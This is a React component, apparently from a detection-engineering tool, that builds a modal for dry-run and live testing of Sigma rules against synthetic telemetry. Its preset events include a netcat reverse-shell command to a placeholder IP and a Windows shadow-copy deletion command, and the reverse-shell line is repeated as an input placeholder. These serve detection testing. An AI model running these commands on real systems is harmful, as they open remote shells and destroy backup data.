import { useState } from "react";
import { Icon } from "../Icon";
import { simulateCustomRule, triggerLiveRuleTest } from "../../lib/api";
import type { RuleSimulationResult, RuleTriggerTestResult } from "../../types";

interface RuleTestingModalProps {
  ruleName: string;
  ruleId?: string;
  customYaml?: string;
  onClose: () => void;
}

const PRESET_EVENTS = [
  {
    name: "Linux Netcat Reverse Shell",
    event: {
      process_name: "nc",
      command_line: "nc -e /bin/bash 198.51.100.25 4444",
      dest_ip: "198.51.100.25",
      dest_port: "4444",
      file_path: "",
      user: "root",
      platform: "linux",
    },
  },
  {
    name: "Windows Shadow Copy Deletion",
    event: {
      process_name: "cmd.exe",
      command_line: "vssadmin.exe delete shadows /all /quiet",
      dest_ip: "",
      dest_port: "",
      file_path: "C:\\Windows\\System32\\vssadmin.exe",
      user: "SYSTEM",
      platform: "windows",
    },
  },
  {
    name: "Benign System Healthcheck",
    event: {
      process_name: "curl",
      command_line: "curl -s http://127.0.0.1:8080/health",
      dest_ip: "127.0.0.1",
      dest_port: "8080",
      file_path: "/usr/bin/curl",
      user: "outpost",
      platform: "linux",
    },
  },
];

export function RuleTestingModal({
  ruleName,
  ruleId,
  customYaml,
  onClose,
}: RuleTestingModalProps) {
  const [eventData, setEventData] = useState(PRESET_EVENTS[0].event);
  const [simRunning, setSimRunning] = useState(false);
  const [simResult, setSimResult] = useState<RuleSimulationResult | null>(null);
  const [simError, setSimError] = useState<string | null>(null);

  const [triggerRunning, setTriggerRunning] = useState(false);
  const [triggerResult, setTriggerResult] = useState<RuleTriggerTestResult | null>(null);
  const [triggerError, setTriggerError] = useState<string | null>(null);

  const handleSimulate = async () => {
    if (!customYaml && !ruleId) return;
    setSimRunning(true);
    setSimError(null);
    try {
      const res = await simulateCustomRule({
        sigma_yaml: customYaml || undefined,
        rule_def: ruleId ? { id: ruleId } : undefined,
        event: {
          ...eventData,
          dest_port: Number(eventData.dest_port) || undefined,
        },
      });
      setSimResult(res);
    } catch (err) {
      setSimError(err instanceof Error ? err.message : "Rule dry-run simulation failed");
    } finally {
      setSimRunning(false);
    }
  };

  const handleLiveTrigger = async () => {
    if (!ruleId && !customYaml) return;
    setTriggerRunning(true);
    setTriggerError(null);
    try {
      const res = await triggerLiveRuleTest({
        rule_id: ruleId,
        sigma_yaml: customYaml || undefined,
        event: {
          ...eventData,
          dest_port: Number(eventData.dest_port) || undefined,
        },
      });
      setTriggerResult(res);
    } catch (err) {
      setTriggerError(err instanceof Error ? err.message : "Live engine trigger test failed");
    } finally {
      setTriggerRunning(false);
    }
  };

  return (
    <div
      role="dialog"
      aria-modal="true"
      aria-label={`Rule Testing & Simulation — ${ruleName}`}
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-xs p-4 font-sans animate-fade-in"
      onClick={onClose}
    >
      <div
        className="w-full max-w-2xl rounded-2xl border border-border-subtle bg-bg-surface shadow-2xl overflow-hidden animate-scale-in"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between border-b border-border-subtle bg-bg-base/80 px-6 py-4">
          <div className="flex items-center gap-2.5">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg border border-accent/40 bg-accent/15 text-accent">
              <Icon name="play" size={15} />
            </div>
            <div>
              <h3 className="text-sm font-bold text-text-primary">
                Dry-Run Rule Simulation · <span className="text-accent">{ruleName}</span>
              </h3>
              <p className="text-[11px] font-mono text-text-muted">
                Synthesize telemetry payloads to verify AST matching &amp; false positive suppression
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="press rounded-lg p-1 text-text-muted hover:bg-bg-elevated hover:text-text-primary transition"
            aria-label="Close modal"
          >
            <Icon name="x" size={16} />
          </button>
        </div>

        <div className="p-6 space-y-4 max-h-[80vh] overflow-y-auto font-mono text-xs">
          {/* Preset buttons */}
          <div className="space-y-1.5">
            <span className="text-[10px] uppercase font-bold text-text-faint tracking-wider">
              Quick Telemetry Presets
            </span>
            <div className="flex flex-wrap gap-2">
              {PRESET_EVENTS.map((p) => (
                <button
                  key={p.name}
                  onClick={() => setEventData(p.event)}
                  className="press rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1 text-[11px] text-text-muted hover:border-accent/40 hover:text-text-primary transition"
                >
                  {p.name}
                </button>
              ))}
            </div>
          </div>

          {/* Form fields */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <div>
              <label className="text-[10px] uppercase text-text-faint block mb-1">Process Name</label>
              <input
                value={eventData.process_name}
                onChange={(e) => setEventData({ ...eventData, process_name: e.target.value })}
                className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
                placeholder="e.g. bash, cmd.exe"
              />
            </div>
            <div>
              <label className="text-[10px] uppercase text-text-faint block mb-1">Target Platform</label>
              <select
                value={eventData.platform}
                onChange={(e) => setEventData({ ...eventData, platform: e.target.value })}
                className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
              >
                <option value="linux">Linux</option>
                <option value="windows">Windows</option>
                <option value="macos">macOS</option>
              </select>
            </div>
          </div>

          <div>
            <label className="text-[10px] uppercase text-text-faint block mb-1">Process Command Line</label>
            <input
              value={eventData.command_line}
              onChange={(e) => setEventData({ ...eventData, command_line: e.target.value })}
              className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
              placeholder="e.g. nc -e /bin/bash 198.51.100.25 4444"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="text-[10px] uppercase text-text-faint block mb-1">Destination IP</label>
              <input
                value={eventData.dest_ip}
                onChange={(e) => setEventData({ ...eventData, dest_ip: e.target.value })}
                className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
                placeholder="198.51.100.25"
              />
            </div>
            <div>
              <label className="text-[10px] uppercase text-text-faint block mb-1">Destination Port</label>
              <input
                value={eventData.dest_port}
                onChange={(e) => setEventData({ ...eventData, dest_port: e.target.value })}
                className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
                placeholder="4444"
              />
            </div>
            <div>
              <label className="text-[10px] uppercase text-text-faint block mb-1">User Context</label>
              <input
                value={eventData.user}
                onChange={(e) => setEventData({ ...eventData, user: e.target.value })}
                className="w-full rounded-lg border border-border-subtle bg-bg-base px-2.5 py-1.5 text-xs text-text-primary outline-none focus:border-accent"
                placeholder="root"
              />
            </div>
          </div>

          {/* Action triggers */}
          <div className="flex items-center justify-end gap-2 pt-2 border-t border-border-subtle">
            {ruleId && (
              <button
                onClick={handleLiveTrigger}
                disabled={triggerRunning}
                className="press inline-flex items-center gap-1.5 rounded-lg border border-border-subtle bg-bg-surface px-4 py-2 font-mono text-xs font-semibold text-text-primary hover:border-accent transition"
              >
                <Icon name={triggerRunning ? "refresh" : "zap"} size={12} className={triggerRunning ? "animate-spin" : ""} />
                <span>{triggerRunning ? "Testing live…" : "Live Engine Trigger"}</span>
              </button>
            )}
            <button
              onClick={handleSimulate}
              disabled={simRunning}
              className="press inline-flex items-center gap-1.5 rounded-lg border border-accent bg-accent px-5 py-2 font-mono text-xs font-bold text-white hover:bg-accent/90 disabled:opacity-50 transition shadow-xs"
            >
              <Icon name={simRunning ? "refresh" : "play"} size={12} className={simRunning ? "animate-spin" : ""} />
              <span>{simRunning ? "Simulating…" : "Run Simulation"}</span>
            </button>
          </div>

          {/* Results display */}
          {simError && (
            <div className="rounded-lg border border-rose-500/30 bg-rose-500/10 p-3 text-rose-400">
              {simError}
            </div>
          )}
          {triggerError && (
            <div className="rounded-lg border border-rose-500/30 bg-rose-500/10 p-3 text-rose-400">
              {triggerError}
            </div>
          )}

          {simResult && (
            <div className={`rounded-xl border p-4 space-y-3 ${
              simResult.matched
                ? "border-emerald-500/40 bg-emerald-500/10"
                : "border-border-subtle bg-bg-base/60"
            }`}>
              <div className="flex items-center justify-between">
                <span className="font-bold text-xs uppercase tracking-wide">
                  Simulation Outcome:
                </span>
                <span className={`rounded-md px-2 py-0.5 font-bold uppercase text-[10px] ${
                  simResult.matched
                    ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
                    : "bg-bg-elevated text-text-muted border border-border-subtle"
                }`}>
                  {simResult.matched ? "RULE MATCHED (ALERT FIRED)" : "NO MATCH (CLEAN PASS)"}
                </span>
              </div>
              <p className="text-[11px] text-text-muted">{simResult.simulated_alert?.details || simResult.recommendation}</p>
              {simResult.diagnostics && simResult.diagnostics.length > 0 && (
                <div className="border-t border-border-subtle/50 pt-2 space-y-1">
                  <span className="text-[10px] uppercase text-text-faint font-semibold">Criteria Diagnostics:</span>
                  <div className="flex flex-wrap gap-1.5">
                    {simResult.diagnostics.map((diag, i) => (
                      <span
                        key={i}
                        className={`rounded px-1.5 py-0.5 text-[10px] border ${
                          diag.passed
                            ? "bg-emerald-500/15 text-emerald-400 border-emerald-500/30"
                            : "bg-bg-surface text-text-muted border-border-subtle"
                        }`}
                      >
                        {diag.original_field || diag.target_field} {diag.modifier}: {diag.status}
                      </span>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}

          {triggerResult && (
            <div className={`rounded-xl border p-4 space-y-2 ${
              triggerResult.alerts_count > 0
                ? "border-rose-500/40 bg-rose-500/10"
                : "border-border-subtle bg-bg-base/60"
            }`}>
              <div className="flex items-center justify-between">
                <span className="font-bold text-xs uppercase tracking-wide">Live Engine Result:</span>
                <span className={`rounded-md px-2 py-0.5 font-bold uppercase text-[10px] ${
                  triggerResult.alerts_count > 0
                    ? "bg-rose-500/20 text-rose-400 border border-rose-500/40"
                    : "bg-bg-elevated text-text-muted"
                }`}>
                  {triggerResult.alerts_count > 0
                    ? `ALERT #${triggerResult.alert_id ?? triggerResult.alert?.rule_id ?? "NEW"} CREATED`
                    : "NO ALERT GENERATED"}
                </span>
              </div>
              <p className="text-[11px] text-text-muted">
                {triggerResult.alert?.details || `Status: ${triggerResult.status} (Run: ${triggerResult.run_id})`}
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
